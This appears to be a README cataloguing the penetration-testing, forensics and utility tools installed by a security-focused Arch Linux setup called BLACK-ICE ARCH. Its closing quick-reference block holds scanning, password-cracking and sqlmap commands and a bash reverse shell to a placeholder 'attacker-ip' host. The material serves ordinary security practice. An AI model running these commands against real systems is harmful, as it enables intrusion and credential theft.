![BLACK-ICE ARCH Banner](images/banner.png)

# BLACK-ICE ARCH - Security Tools Catalog

## 📋 Table of Contents

- [Reconnaissance](#reconnaissance)
- [Web Application Security](#web-application-security)
- [Network Security](#network-security)
- [Wireless Security](#wireless-security)
- [Exploitation](#exploitation)
- [Post-Exploitation](#post-exploitation)
- [Forensics & Analysis](#forensics--analysis)
- [Password Attacks](#password-attacks)
- [Reverse Engineering](#reverse-engineering)
- [Reporting & Documentation](#reporting--documentation)

---

## 🔍 Reconnaissance

### Network Discovery

- **nmap** - Network mapper and security scanner
- **masscan** - Fast TCP port scanner
- **rustscan** - Modern port scanner written in Rust
- **netdiscover** - Active/passive ARP reconnaissance tool

### DNS Enumeration

- **dnsrecon** - DNS enumeration and reconnaissance
- **dnsenum** - DNS enumeration tool
- **fierce** - DNS reconnaissance tool
- **sublist3r** - Subdomain enumeration tool

### OSINT

- **theHarvester** - E-mail, subdomain, and name harvester
- **recon-ng** - Full-featured reconnaissance framework
- **sherlock** - Hunt down social media accounts
- **maltego** - Interactive data mining tool

---

## 🌐 Web Application Security

### Proxies & Interceptors

- **Burp Suite Community** - Web vulnerability scanner and proxy
- **OWASP ZAP** - Web application security scanner
- **Caido** - Modern web security testing toolkit
- **mitmproxy** - Interactive HTTPS proxy

### Scanners

- **nikto** - Web server scanner
- **wpscan** - WordPress security scanner
- **sqlmap** - Automatic SQL injection tool
- **nuclei** - Fast vulnerability scanner based on templates
- **ffuf** - Fast web fuzzer
- **gobuster** - Directory/file & DNS busting tool
- **feroxbuster** - Recursive content discovery tool

### CMS & Framework Tools

- **wpscan** - WordPress vulnerability scanner
- **joomscan** - Joomla vulnerability scanner
- **droopescan** - Drupal & SilverStripe scanner

---

## 🌐 Network Security

### Packet Analysis

- **wireshark** - Network protocol analyzer
- **tcpdump** - Command-line packet analyzer
- **tshark** - Terminal-based Wireshark
- **ettercap** - Network security tool for MITM attacks

### Vulnerability Scanners

- **nessus** - Comprehensive vulnerability scanner (requires license)
- **openvas** - Open-source vulnerability scanner
- **nexpose** - Vulnerability management solution

### Network Tools

- **netcat** - TCP/IP swiss army knife
- **socat** - Multipurpose relay tool
- **proxychains** - Force connections through proxy
- **sshuttle** - VPN over SSH

---

## 📡 Wireless Security

### WiFi Tools

- **aircrack-ng** - WiFi security auditing suite
- **wifite** - Automated wireless attack tool
- **reaver** - WPS brute-force attack tool
- **bully** - WPS brute-force tool
- **kismet** - Wireless network detector and sniffer

### Bluetooth

- **bluez-tools** - Bluetooth utilities
- **blueman** - Bluetooth manager GUI
- **btscanner** - Bluetooth device scanner

---

## 💥 Exploitation

### Frameworks

- **metasploit** - Penetration testing framework
- **exploit-db** - Exploit database
- **searchsploit** - Exploit-DB command-line search

### Exploit Development

- **pwntools** - CTF framework and exploit development
- **ropper** - ROP gadget finder
- **radare2** - Reverse engineering framework

### Payload Generators

- **msfvenom** - Metasploit payload generator
- **veil** - Payload generator and AV evasion

---

## 🎯 Post-Exploitation

### Privilege Escalation

- **linpeas** - Linux privilege escalation scanner
- **winpeas** - Windows privilege escalation scanner
- **linux-exploit-suggester** - Linux kernel exploit suggester
- **gtfobins** - Unix binaries privilege escalation

### Lateral Movement

- **crackmapexec** - Swiss army knife for pentesting networks
- **evil-winrm** - WinRM shell for pentesting
- **impacket** - Network protocols manipulation toolkit
- **bloodhound** - Active Directory attack path analysis

### Persistence

- **empire** - PowerShell and Python post-exploitation framework
- **covenant** - .NET command and control framework

---

## 🔬 Forensics & Analysis

### Disk Forensics

- **autopsy** - Digital forensics platform
- **sleuthkit** - Forensic toolkit
- **volatility** - Memory forensics framework

### Network Forensics

- **networkminer** - Network forensic analysis tool
- **wireshark** - Network protocol analyzer

### File Analysis

- **binwalk** - Firmware analysis tool
- **foremost** - File carving tool
- **exiftool** - Metadata extraction tool
- **strings** - Extract printable strings from files

---

## 🔐 Password Attacks

### Crackers

- **hashcat** - Advanced password recovery (GPU)
- **john** - John the Ripper password cracker
- **hydra** - Network logon cracker
- **medusa** - Parallel network login brute-forcer

### Wordlists

- **rockyou.txt** - Popular password wordlist
- **seclists** - Collection of security lists
- **crunch** - Wordlist generator
- **cewl** - Custom wordlist generator

---

## 🛠️ Reverse Engineering

### Disassemblers

- **ghidra** - NSA reverse engineering framework
- **radare2** - Reverse engineering framework
- **ida-free** - Interactive disassembler (free version)
- **binary-ninja** - Reverse engineering platform

### Debuggers

- **gdb** - GNU debugger
- **peda** - Python Exploit Development Assistance for GDB
- **edb** - Cross-platform debugger

### Decompilers

- **jd-gui** - Java decompiler
- **dnspy** - .NET debugger and assembly editor
- **apktool** - Android APK reverse engineering

---

## 📝 Reporting & Documentation

### Note-Taking

- **obsidian** - Knowledge base and note-taking
- **cherrytree** - Hierarchical note-taking
- **joplin** - Open-source note-taking

### Screenshot & Recording

- **flameshot** - Powerful screenshot tool
- **peek** - Simple screen recorder
- **asciinema** - Terminal session recorder

### Report Generation

- **dradis** - Collaboration and reporting platform
- **faraday** - Collaborative penetration test IDE
- **ghostwriter** - Penetration test report generator

---

## 🎨 Productivity & Development

### Terminals

- **kitty** - GPU-accelerated terminal emulator
- **tmux** - Terminal multiplexer
- **zsh** - Extended shell with Oh-My-Zsh

### Editors

- **neovim** - Hyperextensible Vim-based text editor
- **kate** - Advanced text editor
- **vscodium** - VS Code without telemetry

### Browsers

- **brave** - Privacy-focused browser
- **firefox** - Open-source browser
- **tor-browser** - Anonymous browsing

---

## 📦 Package Managers

- **yay** - AUR helper
- **pacman** - Arch Linux package manager
- **BlackArch** - Penetration testing repository (2800+ tools)
- **Chaotic-AUR** - Pre-built AUR packages

---

## 🔧 System Utilities

### Monitoring

- **htop** - Interactive process viewer
- **btop** - Resource monitor with beautiful UI
- **nethogs** - Network bandwidth monitor per process

### File Management

- **dolphin** - KDE file manager
- **ranger** - Terminal file manager
- **fzf** - Fuzzy finder

### Compression

- **p7zip** - 7-Zip file archiver
- **unzip** - ZIP extraction
- **unrar** - RAR extraction

---

## 🎯 Quick Reference

### Most Used Commands

```bash
# Network Scanning
nmap -sC -sV -oN scan.txt <target>
rustscan -a <target> -- -sC -sV

# Web Enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt

# Password Cracking
hashcat -m 0 -a 0 hashes.txt rockyou.txt
john --wordlist=rockyou.txt hashes.txt

# SQL Injection
sqlmap -u "http://target.com/page?id=1" --dbs

# Reverse Shell
nc -lvnp 4444  # Listener
bash -i >& /dev/tcp/attacker-ip/4444 0>&1  # Target
```

---

**Installation**: All tools are automatically installed via `deploy_hyprland.sh` module `02_security_tools.sh`  
**Updates**: Use `yay -Syu` to update all packages including security tools  
**Documentation**: Most tools include man pages (`man <tool>`) or `--help` flags
